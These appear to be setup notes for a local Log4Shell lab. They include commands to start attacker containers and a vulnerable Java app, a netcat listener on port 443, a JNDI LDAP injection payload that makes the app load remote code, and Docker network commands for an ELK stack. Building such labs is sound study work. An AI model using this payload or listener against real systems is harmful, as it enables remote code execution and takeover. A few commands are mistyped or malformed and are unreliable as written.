# 3204

Set up Attack
```cd log4jshell-lab/attacker
docker-compose build 
docker-compse up -d 
```

Start the java app
```cd log4jshell-lab/victim/vuln-apps/others/basicJar

docker run -it --rm -v "$(pwd)":/opt/maven -w /opt/maven maven mvn clean install
```

Inside 
net cat listener 
`nc -lvnp 443`

run exploit 
`java -cp target/Log4jLabProject-1.0-SNAPSHOT-all.jar com.log4jshell.App '${jndi:ldap://127.0.0.1:1389/Run}'`



# 3204


# run file
#sudo docker-compose build<br/>
#sudo docker-compose up -d 


# check IP
#sudo docker-compose ps 
	sudo docker-compose <id container> | grep IPAddress
  
# stop docker 
	sudo docker-compose kill && docker-compose rm -f 

# Network connectivity
	docker network connect bridge web-server
	docker network connect bridge ldap-server
	docker network connect bridge 3204-logstash-1
	docker network connect bridge 3204-kibana-1
	docker network connect bridge 3204-elasticsearch-1

	docker network disconnect attacker_log4j web-server
	docker network disconnect attacker_log4j ldap-server
	docker network disconnect 3204_elk 3204-logstash-1
	docker network disconnect 3204_elk 3204-kibana-1
	docker network disconnect 3204_elk 3204-elasticsearch-1

	docker network rm attacker_log4j<br/>
	docker network rm 3204_elk

